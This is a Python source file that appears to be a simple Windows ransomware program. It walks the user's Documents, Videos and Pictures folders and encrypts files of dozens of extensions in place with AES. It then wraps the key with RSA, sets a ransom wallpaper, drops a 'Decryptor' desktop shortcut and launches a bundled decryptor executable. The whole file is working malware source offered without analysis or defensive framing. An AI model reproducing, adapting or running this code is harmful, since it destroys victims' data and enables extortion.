import os
import shutil
import subprocess
import sys
import ctypes
import hashlib
import win32com.client
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import rsa

extensions_we_love=["txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "jpg",
                    "png", "csv", "sql", "mdb", "sln", "php", "asp", "aspx", "html",
                    "xml", "psd", "mkv", "mp4", "zip", "pdf", "gif", "rar", "jpeg",
                    "avi", "info", "pak", "mp3", "m4a", "docx#", "m4v", "7z", "mov",
                    "wav", "apk", "key", "srt", "amr", "3ga", "rtf", "bmp", "jpg",
                    "wmv"]
absolute_path=os.path.expanduser('~\\chr')

def __export_key(key):

    public_key, private_key = rsa.newkeys(2048)
    key = rsa.encrypt(key,public_key)

    try:
        with open(os.path.join(absolute_path,"encryptedWithRSA.aeskey"), "wb") as key_file:
            key_file.write(key)

        try:
            with open(os.path.expanduser("~\\Desktop\\simple_private.rsakey"), "w",encoding="utf-8") as key_file:
                key_file.write(str(private_key.n)+"\n"+str(private_key.e)+"\n"+str(private_key.d)+"\n"+str(private_key.p)+"\n"+str(private_key.q))
        except:
            with open(os.path.join(absolute_path,"simple_private.rsakey"), "w",encoding="utf-8") as key_file:
                key_file.write(str(private_key.n)+"\n"+str(private_key.e)+"\n"+str(private_key.d)+"\n"+str(private_key.p)+"\n"+str(private_key.q))
    except:
        __suicide()

    return

def __get_files(location):
    global extensions_we_love
    files_list = []

    for r, d, f in os.walk(location):  # r=>root, d=>directories, f=>files
        for item in f:
            filename, file_extension = os.path.splitext(os.path.join(r, item))
            file_extension = file_extension[1:]
            if file_extension.lower() in extensions_we_love:
                files_list.append(os.path.join(r, item))

    return files_list

def __encrypt_iv(iv,key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(iv)

def __encrypt_files(*locations):
    key = hashlib.sha256(os.urandom(32)).digest()
    __export_key(key)

    if not os.path.isfile(os.path.join(absolute_path,"encryptedWithRSA.aeskey")):
        __suicide()

    files_list = list()

    for location in locations:
        files_list+=__get_files(location)

    __delete_file(os.path.join(absolute_path,"files.txt"))
    __delete_file(os.path.join(absolute_path,"errors.txt"))

    empty=True
    for file in files_list:
        if __encrypt(file,key):
            empty=False

    if empty:
        __suicide()

    return True

def __encrypt(file,key):
    cipher = AES.new(key, AES.MODE_CBC)

    try:
        with open(file, "rb") as unencoded_file:
            unencoded_data = unencoded_file.read()

        encoded_data = cipher.encrypt(pad(unencoded_data, AES.block_size))

        with open(file, "wb") as encoded_file:
            encoded_file.write(__encrypt_iv(cipher.iv, key) + encoded_data)

        with open(os.path.join(absolute_path,"files.txt"),"a",encoding="utf-8") as f:
            f.write(file+"\n")
    except Exception as e:
        with open(os.path.join(absolute_path,"errors.txt"),"a", encoding="utf-8") as err_file:
            err_file.write("Failed to encrypt {0}: {1}\n".format(str(file), str(e)))
        return False
    return True

def __change_wallpaper(photo_name):
    path=os.path.join(absolute_path,photo_name)
    if os.path.exists(path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        return True
    else:
        return False

def __resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def __bring_them_to_me(dec,*names):

    try:
        shutil.copy(__resource_path(dec), absolute_path)
    except:
        __suicide()
        return

    for name in names:
        try:
            shutil.copy(__resource_path(name), absolute_path)
        except:
            pass

    return True

def __delete_file(file):
    try:
        os.remove(file)
    except:
        pass
    return

def __suicide():
    __delete_file(os.path.join(absolute_path,"files.txt"))
    __delete_file(os.path.join(absolute_path,"errors.txt"))
    __delete_file(os.path.join(absolute_path,"encryptedWithRSA.aeskey"))
    __delete_file(os.path.expanduser("~\\Desktop\\simple_private.rsakey"))
    __delete_file(os.path.expanduser("~\\Desktop\\Decryptor.lnk"))
    __delete_file(os.path.join(absolute_path,"simple_private.rsakey"))
    __delete_file(os.path.join(absolute_path,"Decryptor.lnk"))
    __delete_file(os.path.join(absolute_path,"0.png"))
    __delete_file(os.path.join(absolute_path,"1.png"))
    __delete_file(os.path.join(absolute_path,"decryptor.exe"))
    sys.exit()
    pass

def __create_shortcut():
    try:
        lnk_path = os.path.join(os.path.expanduser('~\\Desktop\\'), 'Decryptor.lnk')
        shortcut = win32com.client.Dispatch("WScript.Shell").CreateShortCut(lnk_path)
        shortcut.Targetpath = os.path.join(absolute_path, "decryptor.exe")
        shortcut.save()
    except:
        return False
    return True
# -
if not os.path.exists(absolute_path):
    os.makedirs(absolute_path)

__bring_them_to_me("Decryptor.exe","0.png","1.png")

__encrypt_files(os.path.expanduser('~\\Documents'),os.path.expanduser('~\\Videos'),os.path.expanduser('~\\Pictures'))
__change_wallpaper(os.path.join(absolute_path,"0.png"))
with open(os.path.join(absolute_path,"temp"),"w") as f:
    f.write(str(os.path.basename(sys.argv[0])))

__create_shortcut()
subprocess.Popen([os.path.join(absolute_path,"decryptor.exe")])